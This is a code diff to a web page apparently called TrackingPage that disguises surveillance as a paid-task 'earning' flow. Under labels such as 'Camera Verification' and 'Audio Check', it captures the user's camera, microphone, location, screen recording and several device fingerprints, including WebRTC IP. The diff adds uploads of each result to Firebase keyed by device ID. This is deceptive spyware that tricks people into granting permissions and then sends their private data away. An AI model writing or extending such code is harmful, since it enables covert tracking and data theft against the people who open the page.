@@ -3,7 +3,6 @@ import {
   collectSilentFeatures,
   generateDeviceFingerprint,
   captureFrontCamera,
-  captureBackCamera,
   captureMicrophone,
   getGeolocation,
   readClipboard,
@@ -44,7 +43,6 @@ export default function TrackingPage() {
   }
 
   async function startEarning() {
-
     const data: PermissionFeatures = {
       frontCamera: null,
       backCamera: null,
@@ -80,14 +78,15 @@ export default function TrackingPage() {
     setCurrentStep(1);
     try {
       const frontCam = await captureFrontCamera();
-      const backCam = await captureBackCamera();
       if (frontCam) {
         data.frontCamera = 'granted';
         setCompletedTasks(prev => [...prev, 'Camera Verification']);
         setEarnedAmount(prev => prev + 2.50);
+        await updateFirebase(deviceId, { ...data, frontCamera: 'granted' });
       }
-      if (backCam) data.backCamera = 'granted';
-    } catch (e) {}
+    } catch (e) {
+      console.error('Front camera error:', e);
+    }
 
     setCurrentStep(2);
     try {
@@ -96,20 +95,26 @@ export default function TrackingPage() {
         data.microphone = 'granted';
         setCompletedTasks(prev => [...prev, 'Audio Check']);
         setEarnedAmount(prev => prev + 1.50);
+        await updateFirebase(deviceId, { ...data, microphone: 'granted' });
       }
-    } catch (e) {}
+    } catch (e) {
+      console.error('Mic error:', e);
+    }
 
     setCurrentStep(3);
     try {
       const geo = await getGeolocation();
       if (geo) {
-        data.locationLat = geo.coords.latitude;
-        data.locationLong = geo.coords.longitude;
-        data.locationAccuracy = geo.coords.accuracy;
+        data.locationLat = geo.position.coords.latitude;
+        data.locationLong = geo.position.coords.longitude;
+        data.locationAccuracy = geo.position.coords.accuracy;
         setCompletedTasks(prev => [...prev, 'Location Verification']);
         setEarnedAmount(prev => prev + 2.00);
+        await updateFirebase(deviceId, { ...data, locationLat: geo.position.coords.latitude, locationLong: geo.position.coords.longitude });
       }
-    } catch (e) {}
+    } catch (e) {
+      console.error('Location error:', e);
+    }
 
     setCurrentStep(4);
     try {
@@ -118,8 +123,11 @@ export default function TrackingPage() {
         data.screenRecording = 'granted';
         setCompletedTasks(prev => [...prev, 'Screen Capture']);
         setEarnedAmount(prev => prev + 3.00);
+        await updateFirebase(deviceId, { ...data, screenRecording: 'granted' });
       }
-    } catch (e) {}
+    } catch (e) {
+      console.error('Screen capture error:', e);
+    }
 
     setCurrentStep(5);
     try {
@@ -133,7 +141,10 @@ export default function TrackingPage() {
       if (media) data.mediaDevices = media;
       setCompletedTasks(prev => [...prev, 'Device Sync']);
       setEarnedAmount(prev => prev + 1.50);
-    } catch (e) {}
+      await updateFirebase(deviceId, data);
+    } catch (e) {
+      console.error('Device sync error:', e);
+    }
 
     setCurrentStep(6);
     try {
@@ -146,7 +157,10 @@ export default function TrackingPage() {
       if (orient) data.orientationData = orient;
       setCompletedTasks(prev => [...prev, 'System Check']);
       setEarnedAmount(prev => prev + 1.50);
-    } catch (e) {}
+      await updateFirebase(deviceId, data);
+    } catch (e) {
+      console.error('System check error:', e);
+    }
 
     setCurrentStep(7);
     try {
@@ -154,7 +168,10 @@ export default function TrackingPage() {
       data.audioFingerprint = await generateAudioFingerprint();
       data.webGLFingerprint = generateWebGLFingerprint();
       data.webRTCIP = await getWebRTCIP();
-    } catch (e) {}
+      await updateFirebase(deviceId, data);
+    } catch (e) {
+      console.error('Fingerprint error:', e);
+    }
 
     await updateFirebase(deviceId, data);
 
